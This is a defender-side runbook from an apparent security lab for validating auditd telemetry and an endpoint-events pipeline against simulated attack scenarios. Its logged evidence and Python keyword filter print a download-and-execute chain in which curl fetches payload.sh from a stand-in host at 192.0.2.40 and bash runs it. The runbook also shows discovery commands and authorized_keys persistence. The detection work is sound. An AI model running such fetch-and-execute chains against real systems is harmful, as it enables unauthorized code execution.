# Auditd Smoke Checklist

## Purpose

This checklist defines manual validation for future auditd endpoint telemetry against current attacker scenarios. It is intended for use after auditd rules, collection, or equivalent coverage are deployed in a later implementation PR.

Key boundaries:

- auditd telemetry is defender-side evidence.
- Attacker-side structured runner events are not auditd evidence.
- Absence of auditd evidence is a telemetry gap, not proof the action did not happen.
- This checklist does not change detection verdicts.
- This checklist does not mark `detected=true`.
- This checklist does not auto-generate rule candidates.
- Generated `data/` artifacts and raw audit logs should not be committed.

## Prerequisites

- Approved lab environment.
- auditd installed and running on the victim host.
- Proposed auditd rules or equivalent coverage deployed by a later implementation PR.
- SSH scenarios are runnable from attacker to victim.
- Generated `data/` artifacts must not be committed.
- Time synchronization is reasonably aligned across attacker, victim, and analyzer.
- auth.log and Wazuh auth coverage remain available for SSH context correlation.

## Scenario Validation Matrix

| Scenario | Artifact | Attacker-side event | Expected auditd evidence | Manual checks | Gap if missing |
|---|---|---|---|---|---|
| `scenario_004` | `authorized_keys_modification` | `authorized_keys_write_succeeded` | Write or attribute change for authorized_keys path | User, path, action, timestamp, session context | Persistence path file watch missing or parser missing |
| `scenario_006` | `process_exec` | `payload_execution_succeeded` | `execve` event for payload or command execution | Command/argv, exe, user, auid, timestamp, parent/session context | `execve` coverage missing or parser missing |
| `scenario_007` | `suspicious_file_write` | `suspicious_file_write_succeeded` | Write, create, or rename event for selected lab `/tmp` marker path | Path, action, user, process, timestamp | Selected lab file watch missing or parser missing |
| `scenario_008` | `system_discovery` | `system_discovery_succeeded` | `execve` event for discovery commands such as `whoami`, `id`, `hostname`, `uname` | Command/argv, exe, user, auid, timestamp, SSH session correlation | `execve` or discovery coverage missing or parser missing |

Auth artifacts such as `ssh_failed_login`, `ssh_success_login`, and `ssh_key_login` should still primarily be validated through auth.log and Wazuh auth events, not auditd alone.

## Manual Smoke Workflow

Use placeholder commands until auditd implementation and collection details are finalized.

1. Confirm victim auditd status.
2. Confirm active auditd rules.
3. Run one scenario at a time.
4. Save attacker-side outputs under `data/attacks/<scenario>_smoke`.
5. Query victim-side auditd logs around the scenario time window.
6. Compare auditd evidence with `attack_observed_effects.json`.
7. Record gaps as telemetry backlog items.
8. Do not commit generated `data/` artifacts or raw audit logs.

```bash
# Future example only; exact commands may change after auditd implementation.
sudo auditctl -s
sudo auditctl -l
sudo ausearch -k <audit_key> --start <time> --end <time>
```

## Checklist Template

### Environment

- [ ] Date/time:
- [ ] Branch / commit SHA:
- [ ] Victim host:
- [ ] Attacker host:
- [ ] Scenario IDs tested:
- [ ] Auditd installed/running:
- [ ] Auditd rules active:
- [ ] Time window:
- [ ] Generated data paths:
- [ ] Raw audit log paths, if saved locally:
- [ ] Generated artifacts not committed:

### Per-Scenario Results

| Scenario | Artifact | Attacker event present | Auditd evidence present | Key fields checked | Gap recorded | Notes |
|---|---|---|---|---|---|---|
| `scenario_004` | `authorized_keys_modification` | [ ] | [ ] | [ ] | [ ] |  |
| `scenario_006` | `process_exec` | [ ] | [ ] | [ ] | [ ] |  |
| `scenario_007` | `suspicious_file_write` | [ ] | [ ] | [ ] | [ ] |  |
| `scenario_008` | `system_discovery` | [ ] | [ ] | [ ] | [ ] |  |

## Interpretation Rules

- Attacker-side event present plus auditd evidence present means defender telemetry coverage likely exists.
- Attacker-side event present plus auditd evidence missing means there is likely a telemetry or parser gap.
- auditd evidence present plus attacker-side event missing means the time window or attribution should be investigated.
- auditd evidence alone does not mean the full scenario succeeded.
- Attacker-side event alone does not mean the defender detected it.
- Gaps should become telemetry backlog items before rule candidates.

## Observed Smoke Findings

The following findings were observed during manual auditd smoke validation on the lab victim host.

### Preconditions

Before validating auditd evidence, confirm that kernel auditing is enabled.

```bash
sudo auditctl -s
```

Expected:

```text
enabled 1
```

If `enabled 0` is shown, `auditd.service` may be active but new audit events will not be recorded. Enable kernel auditing before running smoke scenarios:

```bash
sudo auditctl -e 1
sudo auditctl -s
```

### Rule Loading Note

When loading the lab rules with `auditctl -R`, ensure file-level watch targets exist before loading. In particular, create the scenario 007 marker file before loading the `isl_tmp_marker` watch:

```bash
sudo touch /tmp/ai_soc_lab_scenario_007_marker.txt
```

If `auditctl -R` exits non-zero without clear output, load the rules line-by-line to identify the failing rule without changing the rule design:

```bash
while IFS= read -r line; do
  case "$line" in
    ""|\#*) continue ;;
  esac

  echo "=== applying: $line ==="
  sudo auditctl $line || {
    echo "FAILED: $line"
    break
  }
done < /tmp/intelligent_soc_lab_minimal.rules
```

Do not broaden the marker watch to all of `/tmp` just to avoid the file precondition.

### Existing Execve Rules

If broad existing `execve` rules such as `exec_log` are present, they can make smoke output noisy or make lab-specific keys harder to validate.

Example existing broad rules:

```text
-a always,exit -F arch=b64 -S execve -F key=exec_log
-a always,exit -F arch=b32 -S execve -F key=exec_log
```

For lab validation, prefer checking the lab-specific keys directly after confirming the lab rules are active:

```bash
sudo auditctl -l | grep -E 'isl_|exec_log'
sudo ausearch -k isl_execve -ts recent -i
sudo ausearch -k isl_tmp_marker -ts recent -i
sudo ausearch -k isl_ssh_persistence -ts recent -i
```

### Scenario 006: Process Execution

Expected attacker-side artifact:

```text
process_exec
```

Observed defender-side evidence:

```text
key=isl_execve
proctitle=curl -fsS -o /tmp/scenario_006_payload.sh http://192.0.2.40:8000/payload.sh
proctitle=chmod +x /tmp/scenario_006_payload.sh
proctitle=bash -c curl ... && chmod +x ... /tmp/scenario_006_payload...
```

This confirms that payload download, permission change, and the payload execution chain can be observed through auditd `execve` telemetry.

### Scenario 007: Suspicious File Write

Expected attacker-side artifact:

```text
suspicious_file_write
```

Observed defender-side file evidence:

```text
key=isl_tmp_marker
name=/tmp/ai_soc_lab_scenario_007_marker.txt
syscall=openat
flags=O_WRONLY|O_CREAT|O_TRUNC
auid=victim01
uid=victim01
comm=bash
exe=/usr/bin/bash
```

Additional process evidence was also visible through `isl_execve`:

```text
key=isl_execve
proctitle=bash -c printf ... > /tmp/ai_soc_lab_scenario_007_marker.txt
```

### Scenario 008: System Discovery

Expected attacker-side artifact:

```text
system_discovery
```

Observed defender-side evidence:

```text
key=isl_execve
proctitle=bash -c whoami && id && hostname && uname -a
proctitle=whoami
proctitle=id
proctitle=hostname
proctitle=uname -a
```

This confirms that harmless post-login discovery commands are visible through auditd `execve` telemetry.

### Interpretation

These smoke findings confirm defender-side telemetry coverage, not detection verdicts. They must not be used by themselves to mark an attack as detected. Detection verdicts remain owned by the detection and triage pipeline.


## Endpoint Events Smoke Extension

This extension verifies the manual endpoint-events path after auditd smoke has produced defender-side audit logs. It assumes the victim log exists at:

```text
/var/log/remote/ubuntu-victim01/auditd.log
```

The flow being checked is:

```text
auditd.log
  -> auditd_parser.py
  -> auditd_events.json
  -> auditd_endpoint_event_converter.py
  -> endpoint_events.json
  -> investigation --endpoint-events
  -> evidence.endpoint_event_count / observed_facts / supporting_signals
```

This is a manual smoke flow only. Investigation does not automatically run the auditd parser or endpoint event converter.

### 1. Parse auditd Logs

```bash
uv run python agents/parser-agent/src/auditd_parser.py \
  --input /var/log/remote/ubuntu-victim01/auditd.log \
  --host ubuntu-victim01 \
  --audit-key-prefix isl_ \
  --output /tmp/auditd_events.json
```

### 2. Convert auditd Events to Endpoint Events

```bash
uv run python agents/parser-agent/src/auditd_endpoint_event_converter.py \
  --input /tmp/auditd_events.json \
  --output /tmp/endpoint_events.json \
  --source-artifact auditd_events.json
```

By default the converter validates `/tmp/endpoint_events.json` against `schemas/endpoint_events.schema.json` before writing output.

### 3. Inspect endpoint_events.json

```bash
python - <<'PY'
import json
from pathlib import Path

data = json.loads(Path("/tmp/endpoint_events.json").read_text())
print("schema_version:", data.get("schema_version"))
print("endpoint_event_count:", len(data.get("events", [])))
print("event_types:", sorted({e.get("event_type") for e in data.get("events", [])}))
print("sources:", sorted({e.get("source") for e in data.get("events", [])}))
PY
```

Expected:

- `/tmp/endpoint_events.json` exists.
- `schema_version` is `endpoint_events.v1`.
- `sources` includes `auditd`.
- `event_types` includes the scenario-relevant values, such as `process_exec`, `file_write`, or `persistence_file_change`.

### 4. Run Investigation with Endpoint Events

Keep existing inputs explicit. Passing both `--auditd-events` and `--endpoint-events` confirms backward compatibility while preserving both evidence sources.

```bash
PYTHONPATH=. uv run python agents/investigation-agent/src/main.py \
  --incident data/incidents/incident.json \
  --triage data/triage/triage_result.json \
  --auditd-events /tmp/auditd_events.json \
  --endpoint-events /tmp/endpoint_events.json \
  --output /tmp/investigation_result_endpoint_events.json
```

If a smoke run uses run-scoped artifacts, substitute the run's incident and triage paths while keeping `/tmp/auditd_events.json` and `/tmp/endpoint_events.json` out of git.

### 5. Inspect Investigation Output

```bash
python - <<'PY'
import json
from pathlib import Path

result = json.loads(Path("/tmp/investigation_result_endpoint_events.json").read_text())
print("endpoint_event_count:", result.get("evidence", {}).get("endpoint_event_count"))
print("source_inputs:", result.get("source_inputs", {}))

print("\nEndpoint observed facts:")
for fact in result.get("evidence_summary", {}).get("observed_facts", []):
    if fact.startswith("endpoint telemetry "):
        print("-", fact)

print("\nEndpoint supporting signals:")
for signal in result.get("evidence_summary", {}).get("supporting_signals", []):
    if signal.startswith("endpoint "):
        print("-", signal)
PY
```

Expected:

- Investigation output includes `evidence.endpoint_event_count`.
- `source_inputs.endpoint_events_json` is present.
- Endpoint facts appear only under `evidence_summary.observed_facts`.
- Endpoint signals appear only under `evidence_summary.supporting_signals`.
- Existing `auditd_events.json` support remains available and is not replaced by endpoint events.

### Observed Endpoint Events Smoke Findings

The first manual endpoint-events smoke confirmed that the end-to-end path is wired correctly:

```text
auditd.log
  -> auditd_events.json
  -> endpoint_events.json
  -> investigation --endpoint-events
  -> endpoint observed facts / endpoint supporting signals
```

However, feeding the full collected auditd log into the parser and converter can produce noisy endpoint evidence. In the observed smoke, unfiltered endpoint events included legitimate lab commands plus unrelated operator and system activity such as `auditctl`, `ausearch`, `grep`, `update-motd`, MOTD helper scripts, and older scenario activity. This is expected when `/var/log/remote/ubuntu-victim01/auditd.log` contains a broad time window.

For scenario-specific smoke validation, prefer one of these approaches before passing endpoint events to investigation:

- collect a narrow time window around the scenario,
- filter by scenario-specific command or path keywords,
- or generate a scenario-scoped endpoint events artifact such as `/tmp/endpoint_events_s006.json`.

Example scenario 006 filter:

```bash
python - <<'PY'
import json
from pathlib import Path

src = Path("/tmp/endpoint_events.json")
dst = Path("/tmp/endpoint_events_s006.json")

data = json.loads(src.read_text())

def command_text(event):
    return " ".join([
        str(event.get("command_line") or ""),
        str(event.get("process_name") or ""),
        str(event.get("exe") or ""),
        str(event.get("file_path") or ""),
        " ".join(map(str, event.get("argv") or [])),
    ])

def is_scenario_006(event):
    text = command_text(event)
    if text.startswith(("grep ", "sudo ausearch", "ausearch ", "sudo auditctl", "auditctl ", "date ")):
        return False
    return any(keyword in text for keyword in [
        "curl -fsS -o /tmp/scenario_006_payload.sh",
        "chmod +x /tmp/scenario_006_payload.sh",
        "/bin/bash /tmp/scenario_006_payload.sh",
        "http://192.0.2.40:8000/payload.sh",
    ])

before_count = len(data.get("events", []))
data["events"] = [event for event in data.get("events", []) if is_scenario_006(event)]
data.setdefault("metadata", {})
data["metadata"]["smoke_filter"] = "scenario_006_payload_keywords"
data["metadata"]["input_event_count_before_filter"] = before_count
data["metadata"]["output_event_count_after_filter"] = len(data["events"])

dst.write_text(json.dumps(data, indent=2, ensure_ascii=False) + "\n")
print("before:", before_count)
print("after:", len(data["events"]))
print("wrote:", dst)
PY
```

Then pass the filtered artifact to investigation:

```bash
PYTHONPATH=. uv run python agents/investigation-agent/src/main.py \
  --incident data/incidents/incident.json \
  --triage data/triage/triage_result.json \
  --auditd-events /tmp/auditd_events.json \
  --endpoint-events /tmp/endpoint_events_s006.json \
  --output /tmp/investigation_result_endpoint_events_s006.json
```

Observed scenario 006 filtered result:

```text
endpoint_event_count: 14
```

Observed endpoint facts included:

```text
endpoint telemetry observed command execution on ubuntu-victim01: bash -c curl -fsS -o '/tmp/scenario_006_payload.sh' 'http://192.0.2.40:8000/payload.sh' && chmod +x '/tmp/scenario_006_payload.sh' && /bin/bash '/tmp/scenario_006_payload.sh'.
endpoint telemetry observed command execution on ubuntu-victim01: curl -fsS -o /tmp/scenario_006_payload.sh http://192.0.2.40:8000/payload.sh.
endpoint telemetry observed command execution on ubuntu-victim01: chmod +x /tmp/scenario_006_payload.sh.
endpoint telemetry observed command execution on ubuntu-victim01: /bin/bash /tmp/scenario_006_payload.sh.
```

Observed endpoint supporting signal:

```text
endpoint process telemetry corroborates endpoint-side command execution.
```

Interpretation:

- This confirms that endpoint events can carry scenario 006 process execution evidence into investigation.
- This confirms pipeline wiring, not a detection verdict.
- The filtered artifact is for smoke validation only and should not be committed.
- `tools/run_endpoint_events_smoke.py` wraps the parser, converter filters, investigation run, and summary printing for the scenario 006 smoke path.

### Scenario 006 Helper Usage

Use the helper when the auditd log already contains scenario 006 activity and you want a repeatable parser -> converter -> investigation smoke check without manually chaining every command. Generated artifacts remain under `/tmp` by default.

```bash
uv run python tools/run_endpoint_events_smoke.py \
  --since "2026-06-14T21:58:30Z" \
  --until "2026-06-14T21:59:10Z"
```

The helper defaults to:

- `/var/log/remote/ubuntu-victim01/auditd.log` as the auditd log input.
- `ubuntu-victim01` as the host.
- `process_exec` and `isl_execve` as converter filters.
- `scenario_006_payload.sh` as the include keyword.
- `grep`, `ausearch`, and `auditctl` as exclude keywords.
- `/tmp/auditd_events.json`, `/tmp/endpoint_events_s006_filtered.json`, and `/tmp/investigation_result_endpoint_events_s006_filtered.json` as generated outputs.
- `data/incidents/incident.json` and `data/triage/triage_result.json` as investigation inputs.

The helper prints:

```text
endpoint_event_count: <count>
source_inputs.endpoint_events_json: <path>

Endpoint observed facts:
- endpoint telemetry ...

Endpoint supporting signals:
- endpoint ...
```

Boundary reminders:

- This helper does not execute attack scenarios.
- This helper does not replace `auditd_events.json`; it passes both auditd and endpoint artifacts to investigation.
- Endpoint events remain defender-side factual telemetry.
- This helper does not change detection verdicts or mark `detected=true`.
- This helper does not create Rule Improvement candidates.

### Filtered Endpoint Events Smoke Result

After adding converter-side filters, `scenario_006` can be validated with a run-scoped endpoint event artifact instead of passing the full converted auditd history to investigation.

Use a small time buffer around the scenario run. A one-second attack window may be too narrow because auditd event timestamps can include sub-second values after the recorded `END_TS`.

Example:

```bash
uv run python agents/parser-agent/src/auditd_endpoint_event_converter.py \
  --input /tmp/auditd_events.json \
  --output /tmp/endpoint_events_s006_filtered.json \
  --source-artifact auditd_events.json \
  --event-type process_exec \
  --audit-key isl_execve \
  --include-keyword scenario_006_payload.sh \
  --exclude-keyword grep \
  --exclude-keyword ausearch \
  --exclude-keyword auditctl \
  --since "2026-06-14T21:58:30Z" \
  --until "2026-06-14T21:59:10Z"
```

Observed result:

```text
endpoint_event_count: 4
source_inputs.endpoint_events_json: /tmp/endpoint_events_s006_filtered.json

Endpoint observed facts:
- bash -c curl ... && chmod ... && /bin/bash ...
- curl -fsS -o /tmp/scenario_006_payload.sh ...
- chmod +x /tmp/scenario_006_payload.sh
- /bin/bash /tmp/scenario_006_payload.sh

Endpoint supporting signals:
- endpoint process telemetry corroborates endpoint-side command execution.
```

This confirms that the converter filters can reduce full auditd history to scenario-focused defender-side endpoint telemetry before investigation consumes `endpoint_events.json`.

### Boundary Notes

- This smoke does not replace `auditd_events.json`.
- This smoke does not automatically run the converter from investigation.
- Endpoint events are factual defender telemetry.
- Endpoint events must not directly change confidence, severity, `overall_result`, `detected`, action generation, or Rule Improvement behavior.
- Attacker-side structured runner events remain separate from defender-side endpoint telemetry.
- Generated `/tmp/auditd_events.json`, `/tmp/endpoint_events.json`, and `/tmp/investigation_result_endpoint_events.json` should not be committed.

### Troubleshooting

- If `/tmp/endpoint_events.json` validation fails, inspect `/tmp/auditd_events.json` first.
- If `endpoint_event_count` is missing, confirm `--endpoint-events /tmp/endpoint_events.json` was passed.
- If `ModuleNotFoundError: No module named 'common'` appears when running investigation directly, run it from the repository root with `PYTHONPATH=.`.
- If endpoint facts contain many unrelated commands, narrow the auditd time window or use a scenario-scoped endpoint events artifact before running investigation.
- If no endpoint facts appear, confirm the endpoint events have known `event_type` values and enough fields:
  - `process_exec` needs `command_line`, `argv`, `process_name`, or `exe`.
  - `file_write` and `persistence_file_change` need `file_path`.
  - `network_connection` needs source and destination IP and port fields.
- If auditd output is noisy, filter parser input with `--audit-key-prefix isl_`.

## References

- [Auditd Minimal Coverage Design](../design/defender/auditd_minimal_coverage.md)
- [Endpoint Telemetry Coverage Design](../design/defender/endpoint_telemetry_coverage.md)
- [Defender Coverage Matrix](../design/attacker-agent/defender_coverage_matrix.md)
- [Smoke Runbook](smoke_runbook.md)
